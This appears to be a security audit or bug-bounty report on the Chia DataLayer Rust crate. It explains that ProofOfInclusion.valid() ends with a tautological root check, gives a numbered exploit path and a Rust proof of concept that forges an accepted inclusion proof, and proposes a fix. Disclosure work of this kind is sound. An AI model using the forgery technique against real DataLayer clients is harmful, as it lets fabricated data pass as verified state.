### Title
`ProofOfInclusion.valid()` tautological root-hash check allows forged DataLayer inclusion proofs — (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

The `valid()` method on `ProofOfInclusion` contains a final check `existing_hash == self.root_hash()` that is a logical tautology: after the loop completes without returning `false`, `existing_hash` is always identical to `self.root_hash()` by construction. The function therefore only verifies internal layer-to-layer hash consistency and never validates the proof against any externally-supplied tree root. An unprivileged attacker can construct a `ProofOfInclusion` for an arbitrary `node_hash` (e.g., the hash of a fabricated key-value pair) with consistent synthetic layers, and `valid()` will return `true`.

### Finding Description

**Root cause — `valid()` in `proof_of_inclusion.rs`:**

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;          // attacker-controlled

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,                       // attacker-controlled
        );
        if calculated_hash != layer.combined_hash {  // attacker sets combined_hash = calculated_hash
            return false;
        }
        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()                // TAUTOLOGY — always true here
}
```

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // same value existing_hash was just set to
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` equals the last `calculated_hash`, which the loop already asserted equals `layer.combined_hash`. `self.root_hash()` returns that same `last.combined_hash`. The final comparison is therefore always `true` when the loop exits normally — it adds zero security.

**Exploit path:**

1. Attacker picks any target `node_hash` (e.g., `SHA256(fake_key || fake_value)`).
2. Attacker picks an arbitrary `other_hash` and `other_hash_side`.
3. Attacker computes `combined_hash = calculate_internal_hash(node_hash, side, other_hash)`.
4. Attacker constructs `ProofOfInclusion { node_hash, layers: [ProofOfInclusionLayer { other_hash_side: side, other_hash, combined_hash }] }`.
5. `proof.valid()` returns `true`.
6. `proof.root_hash()` returns the attacker-chosen `combined_hash`, which is not the real tree root.

Any verifier that calls only `proof.valid()` — without separately asserting `proof.root_hash() == trusted_root` — accepts the forged proof as genuine inclusion evidence.

The Python binding exposes `valid()` as `py_valid()` and `root_hash()` as `py_root_hash()` as independent methods. The function name `valid()` strongly implies complete proof validation, making it likely that callers omit the separate root-hash check.

### Impact Explanation

An attacker can prove the presence of an arbitrary key-value pair in any DataLayer tree without possessing a real inclusion path. Any consumer of `ProofOfInclusion` that relies on `valid()` alone — including Python DataLayer clients receiving proofs over the network — will accept fabricated state as genuine. This satisfies the allowed High impact: *"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."*

### Likelihood Explanation

The `valid()` API is the sole self-contained verification method exposed to Python callers. Its name implies completeness. The fuzz target and unit tests call `proof.valid()` without a root-hash cross-check, mirroring the likely pattern in production consumers. Any DataLayer client that receives a `ProofOfInclusion` from an untrusted peer and calls only `valid()` is immediately exploitable with a trivially constructed forged proof.

### Recommendation

`valid()` must accept an external trusted root hash and compare against it:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root   // compare against caller-supplied root
}
```

The current `valid()` (internal-consistency-only) should be renamed to `is_internally_consistent()` or removed, so callers are not misled into treating it as a complete security check.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};

fn forged_proof_accepted() {
    // Attacker-chosen "node hash" for a fabricated key-value pair
    let fake_node_hash: Hash = [0xAA; 32];
    let arbitrary_sibling: Hash = [0xBB; 32];

    // Compute a consistent combined_hash so the loop passes
    let combined = chia_datalayer::calculate_internal_hash(
        &fake_node_hash, Side::Left, &arbitrary_sibling,
    );

    let proof = ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Left,
            other_hash: arbitrary_sibling,
            combined_hash: combined,
        }],
    };

    // valid() returns true for a completely fabricated proof
    assert!(proof.valid(), "forged proof accepted — tautology confirmed");
    // root_hash() returns the attacker-chosen combined value, not the real tree root
    assert_eq!(proof.root_hash(), combined);
}
